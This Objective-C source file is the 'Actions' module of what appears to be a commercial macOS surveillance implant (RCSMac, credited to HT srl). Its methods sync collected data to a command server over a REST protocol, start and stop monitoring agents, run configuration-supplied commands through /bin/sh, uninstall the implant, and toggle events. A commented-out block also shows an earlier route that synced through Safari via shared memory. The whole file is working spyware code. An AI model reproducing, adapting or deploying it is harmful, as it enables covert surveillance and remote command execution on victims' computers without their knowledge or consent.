/*
 * RCSMac - Actions
 *
 *  Provides all the actions which should be triggered upon an Event
 *
 * Created by Alfredo 'revenge' Pesoli on 11/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSMActions.h"
#import "RCSMTaskManager.h"
#import "RCSMInfoManager.h"

#import "RESTNetworkProtocol.h"

#import "NSMutableDictionary+ThreadSafe.h"

#import "RCSMCommon.h"
#import "RCSMLogger.h"
#import "RCSMDebug.h"


@implementation RCSMActions

- (id)init
{
  self = [super init];
  
  if (self != nil)
    {
      mActionsLock = [[NSLock alloc] init];
      mIsSyncing   = NO;
    }
  
  return self;
}

- (void)dealloc
{
  [mActionsLock release];
  
  [super dealloc];
}

- (BOOL)actionSync: (NSMutableDictionary *)aConfiguration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  [aConfiguration retain];
  
  BOOL _syncThroughSafariWentOk = NO;
  BOOL _isSyncing;
  NSNumber *status;
  
  NSData *syncConfig = [[aConfiguration objectForKey: @"data"] retain];
  
  [mActionsLock lock];
  _isSyncing = mIsSyncing;
  [mActionsLock unlock];
  
  if (_isSyncing == YES)
    {
#ifdef DEBUG_ACTIONS
      warnLog(@"Another sync op is in place, waiting");
#endif
      
      while (_isSyncing == YES)
        {
          usleep(600000);
          [mActionsLock lock];
          _isSyncing = mIsSyncing;
          [mActionsLock unlock];
        }
        
#ifdef DEBUG_ACTIONS
      infoLog(@"Sync from (waiting) to (performing)");
#endif
    }
  
  [mActionsLock lock];
  mIsSyncing = YES;
  [mActionsLock unlock];
  
  status = [NSNumber numberWithInt: ACTION_PERFORMING];
  [aConfiguration setObject: status
                     forKey: @"status"];
  
/*
#if 0
  if (findProcessWithName(@"Safari") == YES)
    {
#ifdef DEBUG_ACTIONS
      warnLog(@"Found Safari for Sync!");
#endif
      
      NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
      shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
      shMemoryHeader->agentID   = OFFT_COMMAND;
      shMemoryHeader->direction = D_TO_AGENT;
      shMemoryHeader->command   = CR_REGISTER_SYNC_SAFARI;
      
      if ([gSharedMemoryCommand writeMemory: agentCommand
                                     offset: OFFT_COMMAND
                              fromComponent: COMP_CORE] == TRUE)
        {
          NSMutableData *readData;
          shMemoryCommand *shMemCommand;
          NSDate *startDate = [[NSDate alloc] init];
          
          while (_syncThroughSafariWentOk == NO)
            {
              readData = [gSharedMemoryCommand readMemory: OFFT_COMMAND
                                            fromComponent: COMP_CORE];
              
              if (readData != nil)
                {
                  shMemCommand = (shMemoryCommand *)[readData bytes];
                  
                  if (shMemCommand->command == IM_CAN_SYNC_SAFARI)
                    {
                      [startDate release];
                      startDate = [[NSDate alloc] init];
                      
                      while (TRUE)
                        {
                          readData = [gSharedMemoryCommand readMemory: OFFT_COMMAND
                                                        fromComponent: COMP_CORE];
                          
                          if (readData != nil)
                            {
                              shMemCommand = (shMemoryCommand *)[readData bytes];
                              
                              if (shMemCommand->command == IM_SYNC_DONE)
                                {
                                  shMemoryHeader->agentID   = OFFT_COMMAND;
                                  shMemoryHeader->direction = D_TO_AGENT;
                                  shMemoryHeader->command   = CR_UNREGISTER_SAFARI_SYNC;
                                  shMemoryHeader->commandDataSize = [syncConfig length];
                                  
                                  memcpy(shMemoryHeader->commandData,
                                         [syncConfig bytes],
                                         [syncConfig length]);
                                  
                                  if ([gSharedMemoryCommand writeMemory: agentCommand
                                                                 offset: OFFT_COMMAND
                                                          fromComponent: COMP_CORE] == TRUE)
                                    {
#ifdef DEBUG_ACTIONS
                                      infoLog(@"Sync through Safari went ok!");
#endif
                                      
                                      _syncThroughSafariWentOk = YES;
                                      
                                      break;
                                    }
                                }
                            }
                          else
                            {
                              if (fabs([[NSDate date] timeIntervalSinceDate: startDate]) >= 3)
                                {
#ifdef DEBUG_ACTIONS
                                  errorLog(@"Timed out while waiting for response from Safari");
#endif
                                  
                                  break;
                                }
                            }
                          
                          usleep(80000);
                        }
                    }
                  else
                    {
#ifdef DEBUG_ACTIONS
                      errorLog(@"Unexpected response from Safari while Syncing!");
#endif
                      
                      break;
                    }
                }
              else
                {
                  if (fabs([[NSDate date] timeIntervalSinceDate: startDate]) >= 3)
                    {
#ifdef DEBUG_ACTIONS
                      errorLog(@"Timed out while waiting for response from Safari");
#endif
                      
                      break;
                    }
                }
              
              usleep(80000);
            }
        }
      
      [agentCommand release];
    }
#endif
  */
  
  if (_syncThroughSafariWentOk == NO)
    {
      /*RCSMCommunicationManager *communicationManager = [[RCSMCommunicationManager alloc]
                                                        initWithConfiguration: syncConfig];
      
      if ([communicationManager performSync] == FALSE)
        {
#ifdef DEBUG_ACTIONS
          errorLog(@"Sync FAILed");
#endif
          status = [NSNumber numberWithInt: ACTION_STANDBY];
          [aConfiguration setObject: status
                             forKey: @"status"];
          
          [mActionsLock lock];
          mIsSyncing = NO;
          [mActionsLock unlock];
          
          [communicationManager release];
          
          return FALSE;
        }
      
      [communicationManager release]; */
      
      RESTNetworkProtocol *protocol = [[RESTNetworkProtocol alloc]
                                       initWithConfiguration: syncConfig];
      if ([protocol perform] == NO)
        {
#ifdef DEBUB_ACTIONS
          errorLog(@"An error occurred while syncing with REST proto");
#endif
        }
      else
        {
          BOOL bSuccess = NO;
        }
        
      [protocol release];
    }
  
  status = [NSNumber numberWithInt: ACTION_STANDBY];
  [aConfiguration setObject: status
                     forKey: @"status"];
  
  [mActionsLock lock];
  mIsSyncing = NO;
  [mActionsLock unlock];
  
  [syncConfig release];
  [aConfiguration release];
  
  [outerPool release];
  
  return TRUE;
}

- (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration start: (BOOL)aFlag
{
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  
  [aConfiguration retain];
  
  //NSNumber *status;
  NSNumber *status = [NSNumber numberWithInt: 0];
  //status = [aConfiguration objectForKey: @"status"];
  
  //
  // Start/Stop Agent actions got the agentID inside the additional Data
  //
  u_int agentID = 0;
  [[aConfiguration objectForKey: @"data"] getBytes: &agentID];
  
  BOOL success;
  
  if (aFlag == TRUE)
    {
      success = [taskManager startAgent: agentID];
    }
  else
    {
      success = [taskManager stopAgent: agentID];
    }
  
  if (success)
    {
      [aConfiguration setObject: status
                         forKey: @"status"];
    }
  else
    {
#ifdef DEBUG_ACTIONS
      errorLog(@"An error occurred while %@ the agent", (aFlag) ? @"Starting" : @"Stopping");
#endif
    }
  
  [aConfiguration release];
  
  return TRUE;
}

// Done. XXX- fix waituntilExit for task
- (BOOL)actionLaunchCommand: (NSMutableDictionary *)aConfiguration
{
  [aConfiguration retain];
  
  NSData *configData = [[aConfiguration objectForKey: @"data"] retain];
  
  NSMutableString *commandLine = [[NSMutableString alloc] initWithData: configData
                                                              encoding: NSASCIIStringEncoding];

  [commandLine replaceOccurrencesOfString: @"$dir$"
                               withString: [[NSBundle mainBundle] bundlePath]
                                  options: NSCaseInsensitiveSearch
                                    range: NSMakeRange(0, [configData length])];


  NSMutableArray *_arguments = [[NSMutableArray alloc] init];

  [_arguments addObject: @"-c"];
  [_arguments addObject: commandLine];

  NSTask *task = [[NSTask alloc] init];
  [task setLaunchPath: @"/bin/sh"];
  [task setArguments: _arguments];

  NSPipe *pipe = [NSPipe pipe];
  [task setStandardOutput: pipe];
  [task setStandardError: pipe];

  [task launch];
  [task waitUntilExit];
  [task release];

  NSNumber *status = [NSNumber numberWithInt: 0];
  [aConfiguration setObject: status forKey: @"status"];

  [configData release];
  [commandLine release];
  [_arguments release];

  [aConfiguration release];

  return TRUE;
}

// Done.
- (BOOL)actionUninstall: (NSMutableDictionary *)aConfiguration
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  RCSMTaskManager *taskManager = [RCSMTaskManager sharedInstance];
  
  [aConfiguration retain];
  
  [taskManager uninstallMeh];
  
  NSNumber *status = [NSNumber numberWithInt: 0];
  [aConfiguration setObject: status forKey: @"status"];
  
  [aConfiguration release];
  
  [pool release];
  
  return TRUE;
}

// Done.
- (BOOL)actionInfo: (NSMutableDictionary *)aConfiguration
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
  
  [aConfiguration retain];

  NSData *stringData = [aConfiguration objectForKey: @"data"];
  
  NSString *text = [[NSString alloc] initWithData: stringData
                                         encoding: NSUTF16LittleEndianStringEncoding];
  
  [infoManager logActionWithDescription: text];
  
  [text release];
  [infoManager release];
  [aConfiguration release];

  [pool release];
  
  return TRUE;
}

typedef struct {
  UInt32 enabled;
  UInt32 event;
} action_event_t;

// FIXED-
- (BOOL)actionEvent: (NSMutableDictionary *)aConfiguration
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSNumber *newStatus;
  action_event_t *event;
  
  [aConfiguration retain];
  
  event = (action_event_t*)[[aConfiguration objectForKey: @"data"] bytes];
  
  if (event != nil)
    {
      NSMutableDictionary *anEvent = 
                          [[[RCSMTaskManager sharedInstance] mEventsList] objectAtIndex: event->event];
      
      @synchronized(anEvent)
      {  
        NSNumber *enabled = [anEvent objectForKey: @"enabled"];
        
        if (enabled != nil)
          {
            if (event->enabled == TRUE) 
              {
                newStatus = [NSNumber numberWithInt: 1];
              }
            else
              newStatus = [NSNumber numberWithInt: 0];
            
            [anEvent setObject: newStatus forKey: @"enabled"];
          }
        }
    }
    
  [aConfiguration release];
  
  [pool release];
  
  return TRUE;
}

@end
